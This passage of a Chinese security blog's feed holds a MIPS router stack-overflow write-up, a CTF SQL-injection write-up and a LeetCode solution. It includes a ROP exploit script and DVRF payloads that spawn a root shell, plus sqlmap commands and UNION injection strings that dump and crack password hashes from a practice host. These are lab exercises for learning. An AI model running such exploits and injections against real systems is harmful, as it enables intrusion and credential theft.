alt="rop1"></p><p>f7单步一次，跳转到<code>gadget</code>而且此时栈空间已经布置好了<code>addiu $a1, $sp, 0x58+var_40</code>相当于 <code>$a1 = $sp+0x18</code></p><p>此时<code>$sp+0x18</code>存放的就是<code>/bin/sh</code>字符串的地址<img src="https://i.imgur.com/EewHvzW.png" alt="rop3"></p><p>然而不知道为什么这个错误就很不明不白了<img src="https://i.imgur.com/sUi3w2O.png" alt="rop4"></p><p>重新回顾了一下《揭秘家用路由器0day漏洞挖掘技术》，看到了作者写的一个exp将gadget的地址替换成我的，如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">cmd = &quot;sh&quot;</span><br><span class="line"></span><br><span class="line">cmd += &quot;\x00&quot;*(4-len(cmd)%4)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;A&quot;*0x19c</span><br><span class="line">shellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadget地址，作者写的是&quot;&lt;L&quot;但是我尝试之后发现地址是反的，所以换过来了</span><br><span class="line">shellcode+=&quot;A&quot;*24</span><br><span class="line">shellcode+=cmd</span><br><span class="line">shellcode+=&quot;B&quot;*(0x3C-len(cmd))</span><br><span class="line">shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0函数地址</span><br><span class="line">shellcode+=&quot;BBBB&quot;</span><br><span class="line"></span><br><span class="line">print &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">print &quot;[+] create password file&quot;</span><br><span class="line">fw = open(&apos;passwd&apos;, &apos;w&apos;)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br><span class="line">print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p><p>生成<code>passwd</code>文件之后，<code>./qemu-mipsel-static -g 1234 ./vuln_system</code>进行调试当程序跳转到<code>gadget</code>时，变成了这样，<img src="https://i.imgur.com/ibeZvb8.png" alt="rop5"></p><p>此时看终端：我居然成功了？？此时已经拿到了root权限<img src="https://i.imgur.com/m1S8DHs.png" alt="rop6"></p><p>确实没有看错，重新运行一遍程序，确实拿到了shell权限<img src="https://i.imgur.com/VbXRlHO.png" alt="rop7"></p><h1>DVRF 练习</h1><p>这个在attifyOS上已经下载好了，当然也可以去GitHub上clone一份，一个很不错的项目</p><p>来看Intro的<code>stack_bof_01</code>程序位于<code>/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/</code></p><p>源码位于<code>/home/oit/DVRF/Pwnable Source/Intro</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//Simple BoF by b1ack0wl for E1550</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv[])&#123;</span><br><span class="line">char buf[200] =&quot;\0&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);</span><br><span class="line">strcpy(buf, argv[1]);</span><br><span class="line"></span><br><span class="line">printf(&quot;You entered %s \r\n&quot;, buf);</span><br><span class="line">printf(&quot;Try Again\r\n&quot;);</span><br><span class="line"></span><br><span class="line">return 0x41; // Just so you can see what register is populated for return statements</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dat_shell()&#123;</span><br><span class="line">printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);</span><br><span class="line">system(&quot;/bin/sh -c&quot;);</span><br><span class="line"></span><br><span class="line">//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);</span><br><span class="line">//execve(&quot;/bin/sh&quot;, 0, 0);</span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>显然也是<code>strcpy</code>函数没有限制拷贝的长度</p><p>运行它：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01</span><br><span class="line">Usage: stack_bof_01 &lt;argument&gt;</span><br><span class="line">-By b1ack0wl</span><br></pre></td></tr></table></figure></p><p>我们直接计算偏移地址</p><p>生成长度为200的字符串</p><p><img src="https://i.imgur.com/rTQh75u.png" alt="stack0"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [5:50]</span><br><span class="line">&gt; python patternOffset.py -s 0x41386741 -l 200</span><br><span class="line">[*] Create pattern string contains 200 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 204 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0042 s</span><br></pre></td></tr></table></figure></p><p>那我们试一试直接填充</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; test</span><br><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234  ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot;</span><br></pre></td></tr></table></figure></p><p>此时已经将<code>$ra</code>寄存器的值覆盖掉了但是<img src="https://i.imgur.com/iaNBx6x.png" alt="stack1"></p><p>在<code>dat_shell</code>函数中报错了所以这时候需要借助<code>gadget</code></p><p><img src="https://i.imgur.com/EIr3CJx.png" alt="error2"></p><p>之前参考了几篇文章，都是通过查找libc的基地址来确认<code>gadget</code>在内存中的地址的，但是我开始要gdb调试的时候并没有看到<code>libc.so.0</code>的加载，所以我一直怀疑是不是没加载，然后然后，看到原程序中是有puts和memset这些函数的，那显然是加载了的于是下一个断点然后调试</p><p><img src="https://i.imgur.com/InVI4HI.png" alt="vmmap"></p><p>终于找到了libc的加载基址</p><p><img src="https://i.imgur.com/mIhckGP.png" alt="gadget"></p><p>这样就好办了<code>python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test</code></p><p>之后运行</p><p>ok已经成功了！！！<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;</span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �@P@</span><br><span class="line">Try Again</span><br><span class="line">Congrats! I will now execute /bin/sh</span><br><span class="line">- b1ack0wl</span><br></pre></td></tr></table></figure></p><p>不过为啥用<code>mipsrop</code>找不到这个gadget呢？很疑惑</p><p>确认libc基址的方法大概有：</p><ol><li>vmmap</li><li>cat /proc/pid/maps查看进程的内存分布</li><li>在IDA中查找到函数真正加载的位置，然后计算偏移</li></ol><h1>参考</h1><p><a href="https://www.anquanke.com/post/id/169689#h3-12" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（一）</a>(感觉这篇文章中第二个程序调试的不是很正确，因为偏移计算的都不一样)<a href="https://www.anquanke.com/post/id/171918#h2-0" target="_blank" rel="noopener">路由器漏洞挖掘之栈溢出入门（二）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;MIPS栈溢出&lt;/h1&gt;
&lt;h2&gt;x86和MIPS指令集&lt;/h2&gt;
&lt;p&gt;在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm&lt;/p&gt;
&lt;h
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="MIPS" scheme="https://prontosil.club/tags/MIPS/"/>
    
  </entry>
  
  <entry>
    <title>两道sql注入题</title>
    <link href="https://prontosil.club/2019/07/15/%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
    <id>https://prontosil.club/2019/07/15/两道sql注入题/</id>
    <published>2019-07-15T01:16:49.000Z</published>
    <updated>2019-07-22T05:25:59.913Z</updated>
    
    <content type="html"><![CDATA[<h1>基于sql的盲注</h1><p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p><p>如果是针对post表单这种方式</p><ol><li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li><li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li><li>指定参数</li></ol><p>趁机学到了一把<code>sqlmap</code>使用虽然这个题目是有点。。但是注入点的判断也是很重要的</p><h2>爆后端数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p><p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p><h2>爆数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p><p><img src="https://i.imgur.com/JqIhPQS.png" alt="database"></p><h2>指定数据库报表爆表</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p><p><img src="https://i.imgur.com/qNL5qbg.png" alt="table"></p><h2>指定数据库和表爆字段</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p><p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p><h2>指定数据库，表，字符然后dump出数据</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code>![member](https://i.imgur.com/iRvoAHX.<img src="https://i.imgur.com/B6oLiAA.png" alt="password"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p><p>解密之后是106370这样就能登陆后台了<img src="https://i.imgur.com/6KXMijL.png" alt="houtai"><img src="https://i.imgur.com/yxq3qQi.png" alt="key0">太神奇了</p><p>参考<a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)----POST登陆框注入实战</a></p><h1>SQL手工注入漏洞测试(Access数据库)</h1><p>这道题目就有点神奇了</p><p>纯靠猜</p><p><code>order by 4</code>判断有多少个字段</p><p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p><p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0">接下来判断回显位置<code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p><p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1">接下来猜测字段值<code>and exists (select id from admin)</code></p><p>爆出字段值<code>union select 1,username,passwd,id from admin</code><img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p><p>md5解密一下登陆就行了</p><p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;基于sql的盲注&lt;/h1&gt;
&lt;p&gt;之前一直没有好好地学习过&lt;code&gt;sqlmap&lt;/code&gt;的使用方法&lt;/p&gt;
&lt;p&gt;如果是针对post表单这种方式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以将抓到的包保存成一个文件，然后使用 &lt;code&gt;sqlmap.py -r &amp;quot;p
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode 2</title>
    <link href="https://prontosil.club/2019/07/15/Leetcode-2/"/>
    <id>https://prontosil.club/2019/07/15/Leetcode-2/</id>
    <published>2019-07-15T01:12:08.000Z</published>
    <updated>2019-07-22T05:31:17.921Z</updated>
    
    <content type="html"><![CDATA[<h1>错解</h1><p>怎么快速地将链表倒置</p><p>😕</p><p><img src="https://i.imgur.com/phNwhfi.png" alt="wrong"></p><p>最后还是因为溢出的问题</p><p>思路：</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​        <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ListNode temp1 = l1;</span><br><span class="line"></span><br><span class="line">        ListNode temp2 = l2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> resultl1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> resultl2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (temp1 != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tempvalue = temp1.val;</span><br><span class="line"></span><br><span class="line">            resultl1 = resultl1 + tempvalue * Math.pow(<span class="number">10</span>, k);</span><br><span class="line"></span><br><span class="line">            k++;</span><br><span class="line"></span><br><span class="line">            temp1 = temp1.next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等</p><p>将得到的结果在转化为链表</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = (<span class="keyword">int</span>) (resultl1 + resultl2);</span><br><span class="line"></span><br><span class="line">ListNode ans = <span class="keyword">new</span> ListNode(<span class="number">0</span>); <span class="comment">//先取一个头节点</span></span><br><span class="line"></span><br><span class="line">ListNode head = ans;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length = Integer.toString(result).length();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">    ListNode temp = <span class="keyword">new</span> ListNode(result % <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    head.next = temp;</span><br><span class="line"></span><br><span class="line">    head = head.next;</span><br><span class="line"></span><br><span class="line">    result = result / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>记录一下将整数转为string的操作</p><blockquote><p>Integer.toString(result)</p></blockquote><p>Math.pow函数的返回值必须是double类型的</p><p>但是这样会面临一个问题，也就是最开图片的那个，溢出！</p><h1>正解</h1><p>看了眼答案，才明白自己从开始就想错了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123;</span><br><span class="line"></span><br><span class="line">    ListNode dummyHead = new ListNode(0);</span><br><span class="line"></span><br><span class="line">    ListNode p = l1, q = l2, curr = dummyHead;</span><br><span class="line"></span><br><span class="line">    int carry = 0;</span><br><span class="line"></span><br><span class="line">    while (p != null || q != null) &#123;</span><br><span class="line"></span><br><span class="line">        int x = (p != null) ? p.val : 0;</span><br><span class="line"></span><br><span class="line">        int y = (q != null) ? q.val : 0;</span><br><span class="line"></span><br><span class="line">        int sum = carry + x + y;</span><br><span class="line"></span><br><span class="line">        carry = sum / 10;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(sum % 10);</span><br><span class="line"></span><br><span class="line">        curr = curr.next;</span><br><span class="line"></span><br><span class="line">        if (p != null) p = p.next;</span><br><span class="line"></span><br><span class="line">        if (q != null) q = q.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (carry &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(carry);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return dummyHead.next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最关键的就是</p><p>==int x = (p != null) ? p.val : 0;</p><p>int y = (q != null) ? q.val : 0;</p><p>int sum = carry + x + y;</p><p>carry = sum / 10;</p><p>curr.next = new ListNode(sum % 10);==</p><p>其实只需要从低位开始一位位的加上去就好了。</p><p>然后再把它们给链起来</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;错解&lt;/h1&gt;
&lt;p&gt;怎么快速地将链表倒置&lt;/p&gt;
&lt;p&gt;😕&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/phNwhfi.png&quot; alt=&quot;wrong&quot;&gt;&lt;/p&gt;
&lt;p&gt;最后还是因为溢出的问题&lt;/p&gt;
&lt;p&gt;思路：&lt;/p&gt;
&lt;p&gt;&lt;fig
      
    
    </summary>
    
      <category term="leetcode" scheme="https://prontosil.club/categories/leetcode/"/>
    
    
      <category term="leetcode" scheme="https://prontosil.club/tags/leetcode/"/>
    
      <category term="java" scheme="https://prontosil.club/tags/java/"/>
    
  </entry>
  
</feed>
